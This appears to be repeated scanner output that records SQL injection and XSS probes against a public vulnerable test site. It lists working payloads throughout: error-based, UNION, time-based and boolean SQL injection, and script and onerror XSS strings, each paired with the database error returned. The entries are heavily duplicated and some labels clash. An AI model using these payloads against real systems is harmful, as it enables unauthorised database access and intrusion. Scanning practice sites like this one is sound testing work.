+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Detected: True
+Common_payload: ';}<h1>test</h1>//
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Detected: True
+Common_payload: ';}<h1>test</h1>//
+Common_Confidence: 50
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Detected: True
+Common_payload: ';}<h1>test</h1>//
+Common_Confidence: 50
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Detected: True
+Common_payload: '"<script>alert({{1234**3}})</script><!---
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Detected: True
+Common_payload: '"<script>alert({{1234**3}})</script><!---
+Common_Confidence: 50
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Detected: True
+Common_payload: '"<script>alert({{1234**3}})</script><!---
+Common_Confidence: 50
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Detected: True
+Common_payload: <img src=x onerror='javascript:alert(6)'>
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
